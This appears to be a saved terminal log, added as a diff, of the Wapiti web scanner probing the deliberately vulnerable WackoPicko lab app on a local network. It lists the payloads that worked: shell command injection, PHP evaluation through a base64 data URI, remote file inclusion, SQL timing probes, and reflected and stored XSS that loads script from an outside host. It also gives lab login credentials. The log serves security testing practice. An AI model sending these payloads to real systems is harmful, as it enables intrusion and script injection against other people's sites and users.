@@ -1,0 +1,162 @@
+Last login: Wed Aug  8 21:36:52 on ttys001
+Ranas-MacBook-Air:~ ranakhalil$ cd Desktop/programs/wapiti3-3.0.1/bin/
+Ranas-MacBook-Air:bin ranakhalil$ open .
+Ranas-MacBook-Air:bin ranakhalil$ bash wapiti-wackopicko-default-initial-script.sh 
+
+     __      __               .__  __  .__________
+    /  \    /  \_____  ______ |__|/  |_|__\_____  \ 
+    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
+     \        /  / __ \|  |_> >  ||  | |  |/       \ 
+      \__/\  /  (____  /   __/|__||__| |__/______  /
+           \/        \/|__|                      \/
+Wapiti-3.0.1 (wapiti.sourceforge.net)
+[*] Saving scan state, please wait...
+
+ Note
+========
+This scan has been saved in the file /Users/ranakhalil/.wapiti/scans/192.168.0.26_folder_edc21351.db
+[*] Wapiti found 75 URLs and forms during the scan
+[*] Loading modules:
+	 mod_crlf, mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql, mod_permanentxss, mod_nikto, mod_delay, mod_buster, mod_shellshock, mod_methods, mod_ssrf
+
+[*] Launching module exec
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    GET /WackoPicko/admin/index.php?page=%3Benv HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+PHP evaluation in http://192.168.0.26/WackoPicko/admin/index.php via injection in the parameter page
+Evil request:
+    GET /WackoPicko/admin/index.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    POST /WackoPicko/admin/index.php?page=%3Benv HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+---
+PHP evaluation in http://192.168.0.26/WackoPicko/admin/index.php via injection in the parameter page
+Evil request:
+    POST /WackoPicko/admin/index.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+---
+Blind command execution in http://192.168.0.26/WackoPicko/passcheck.php via injection in the parameter password
+Evil request:
+    POST /WackoPicko/passcheck.php HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/passcheck.php
+    Content-Type: application/x-www-form-urlencoded
+
+    password=a%60sleep%2060%60
+---
+
+[*] Launching module file
+---
+Remote inclusion vulnerability in http://192.168.0.26/WackoPicko/admin/index.php via injection in the parameter page
+Evil request:
+    GET /WackoPicko/admin/index.php?page=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+Timeout occurred in http://192.168.0.26/WackoPicko/calendar.php
+Evil request:
+    GET /WackoPicko/calendar.php?date=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+Remote inclusion vulnerability in http://192.168.0.26/WackoPicko/admin/index.php via injection in the parameter page
+Evil request:
+    POST /WackoPicko/admin/index.php?page=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+
+[*] Launching module sql
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    GET /WackoPicko/admin/index.php?page=%C2%BF%27%22%28 HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    POST /WackoPicko/admin/index.php?page=%C2%BF%27%22%28 HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+
+[*] Launching module xss
+---
+XSS vulnerability in http://192.168.0.26/WackoPicko/pictures/search.php via injection in the parameter query
+Evil request:
+    GET /WackoPicko/pictures/search.php?query=%22%2F%3E%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwbjhm7grdrz.js%3E%3C%2Fscript%3E&x=1&y=1 HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/
+---
+---
+XSS vulnerability in http://192.168.0.26/WackoPicko/guestbook.php via injection in the parameter comment
+Evil request:
+    POST /WackoPicko/guestbook.php HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/guestbook.php
+    Content-Type: application/x-www-form-urlencoded
+
+    name=default&comment=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fws9u8rjdruz.js%3E%3C%2Fscript%3E
+---
+
+[*] Launching module ssrf
+
+[*] Launching module blindsql
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    GET /WackoPicko/admin/index.php?page=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    POST /WackoPicko/admin/index.php?page=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+
+[*] Launching module permanentxss
+---
+Stored XSS vulnerability in http://192.168.0.26/WackoPicko/guestbook.php via injection in the parameter comment
+Evil request:
+    POST /WackoPicko/guestbook.php HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/guestbook.php
+    Content-Type: application/x-www-form-urlencoded
+
+    name=default&comment=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fws9u8rjdruz.js%3E%3C%2Fscript%3E
+---
+
+Report
+------
+A report has been generated in the file wapiti-wackopicko-default-initial-result.txt
+Ranas-MacBook-Air:bin ranakhalil$
